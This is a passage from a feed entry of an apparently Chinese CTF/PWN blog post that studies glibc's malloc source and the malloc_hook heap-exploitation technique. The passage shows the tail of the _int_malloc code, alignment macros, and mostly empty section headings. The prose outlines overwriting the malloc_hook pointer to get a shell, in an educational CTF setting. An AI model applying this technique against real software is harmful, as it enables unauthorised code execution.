class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>malloc相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*申请的堆块对齐的宏定义*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span></span><br><span class="line"><span class="comment">/* This is the correct definition when there is no past ABI to constrain it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Among configurations with a past ABI constraint, it differs from</span></span><br><span class="line"><span class="comment">   2*SIZE_SZ only on powerpc32.  For the time being, changing this is</span></span><br><span class="line"><span class="comment">   causing more compatibility problems due to malloc_get_state and</span></span><br><span class="line"><span class="comment">   malloc_set_state than will returning blocks not adequately aligned for</span></span><br><span class="line"><span class="comment">   long double objects under -mlong-double-128.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure></details><h2 id="malloc_hook的位置"><a href="#malloc-hook的位置" class="headerlink" title="malloc_hook的位置"></a>malloc_hook的位置</h2><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li>在<code>how2heap</code>这个仓库中并没有关于<code>malloc_hook</code>的，也有可能是结合在其他堆利用中，所以我就找了其他师傅的博客。</li></ul><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li>这边<code>malloc_hook</code>的利用方式其实是需要和其他漏洞利用去打组合计。<code>malloc_hook</code>只是在最后一步<code>getshell</code>中才比较起作用。</li><li><code>malloc_hook</code>就是让我们直接修改这个<code>malloc_hook</code>函数指针的值，使得我们在执行<code>malloc()</code>函数的时候就可以被钩到我们指定的地址中，最后就会<code>getshell</code></li><li>这边就先介绍一下一些组合计。</li></ul><h2 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h2><h2 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h2><h1 id="malloc_hook_level_1"><a href="#malloc-hook-level-1" class="headerlink" title="malloc_hook_level_1"></a>malloc_hook_level_1</h1><h1 id="malloc_hook_level_2"><a href="#malloc-hook-level-2" class="headerlink" title="malloc_hook_level_2"></a>malloc_hook_level_2</h1><h1 id="malloc_hook_level_3"><a href="#malloc-hook-level-3" class="headerlink" title="malloc_hook_level_3"></a>malloc_hook_level_3</h1><h1 id="malloc_hook_level_4"><a href="#malloc-hook-level-4" class="headerlink" title="malloc_hook_level_4"></a>malloc_hook_level_4</h1><h1 id="malloc_hook_level_5"><a href="#malloc-hook-level-5" class="headerlink" title="malloc_hook_level_5"></a>malloc_hook_level_5</h1>]]></content>
    
    
    <summary type="html">前言：学习一下hook技术,先学习malloc,之后还有free_hook和realloc_hook</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
</feed>
